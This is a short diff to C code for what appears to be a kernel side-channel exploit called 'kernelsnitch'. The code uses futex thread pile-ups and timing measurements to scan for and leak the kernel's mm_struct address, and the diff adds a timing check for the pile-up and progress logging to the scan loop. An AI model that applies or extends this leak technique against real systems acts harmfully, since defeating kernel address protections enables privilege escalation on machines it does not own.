@@ -99,6 +99,8 @@ struct kernelsnitch_shared_state {
 
 #define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)
 
+static size_t __measure(size_t futex_addr);
+
 /**
  * FUTEX syscall
  */
@@ -141,7 +143,11 @@ static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t a
         inc_arg->ks = ks;
         SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));
     }
-    WAIT();
+    /* Wait for all threads to block in FUTEX_WAIT_PRIVATE */
+    for (size_t i = 0; i < 16; ++i) sched_yield();
+    /* Verify pile-up: measure timing of the pile-up address */
+    size_t approx_time = __measure((size_t)&ks->inc_futex[id]);
+    if (ks->verbose) pr_info("pile-up verified: approx_time=%zu\n", approx_time);
 }
 
 /**
@@ -201,6 +207,7 @@ static void *__mm_leak(void *arg)
     struct range *range = &mm_leak_arg->range;
     if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
     size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
+    size_t candidates_tested = 0;
     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
@@ -233,10 +240,15 @@ static void *__mm_leak(void *arg)
                             break;
                         }
                     }
-                } 
+                }
+                candidates_tested++;
+                /* Print progress every 100k candidates to trace crash location */
+                if (candidates_tested % 100000 == 0)
+                    pr_info("[% 3zd] tested %zu candidates, scanning=0x%zx\n", range->id, candidates_tested, mm_struct_candidate);
             }
         }
     }
+    pr_info("[% 3zd] thread done, tested %zu candidates\n", range->id, candidates_tested);
     free(mm_leak_arg);
     return 0;
 }
